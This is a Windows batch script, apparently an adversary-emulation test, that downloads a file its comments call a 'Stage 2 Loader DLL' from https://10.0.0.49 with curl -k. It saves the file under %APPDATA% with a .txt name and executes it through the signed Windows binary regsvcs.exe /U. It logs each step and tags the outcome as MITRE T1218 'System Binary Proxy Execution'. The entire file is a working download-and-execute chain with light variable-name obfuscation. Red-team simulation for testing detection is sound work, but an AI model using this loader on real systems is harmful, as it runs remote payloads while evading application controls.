@echo off
setlocal enabledelayedexpansion

REM --- Random-named SET variables for all PHR placeholders ---
set lqewrm=https://10.0.0.49/stage/2/icon.png?10356-7
set pouytr=%APPDATA%\10356\7912283d
set zxcvbn=7fae5118.txt
set rtyuio=%APPDATA%\7
set asdfgh=%APPDATA%\7\macula-simulations.log
set qwerty=ITZEL-S2B
set uiopkl=10356
set jklmno=7

REM --- Initialize log file path and timestamp ---
set logfile=%APPDATA%\!jklmno!\macula-simulations.log
set tsvar=!DATE!/!TIME!

REM --- Debug: heartbeat start ---
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: heartbeat_start>> "!logfile!" 2>nul

REM --- Heartbeat fetch (download Stage 2 Loader DLL) ---
curl -k -s -o "!pouytr!\!zxcvbn!" "!lqewrm!"

REM --- Check curl result and log debug ---
if errorlevel 1 (
    set hb_result=1
) else (
    set hb_result=0
)
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: heartbeat_complete=!hb_result!>> "!logfile!" 2>nul

REM --- Change to output directory ---
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: chdir_start>> "!logfile!" 2>nul
cd /d "!pouytr!" >nul 2>&1
set chdir_err=%errorlevel%
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: chdir_result=!chdir_err!>> "!logfile!" 2>nul

REM --- LOLBIN invocation: regsvcs.exe /U to trigger ComUnregisterFunction ---
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: regsvcs_start>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!zxcvbn!" >NUL 2>&1
set lolbin_err=%errorlevel%
echo [!tsvar!][DEBUG][!qwerty!][!uiopkl!]: regsvcs_result=!lolbin_err!>> "!logfile!" 2>nul

REM --- Determine TTP result and log TTP line ---
set ttp_result=OK
set ttp_error=
if !lolbin_err! neq 0 (
    set ttp_result=FAIL
    set ttp_error=lolbin_execution_failed
)
rem Capture timestamp at TTP completion
set ttpts=!date! !time!
echo [!ttpts!][TTP][!qwerty!][!uiopkl!]: T1218^|System Binary Proxy Execution=[!ttp_result!]:[!ttp_error!]>> "!logfile!" 2>nul

exit /b 0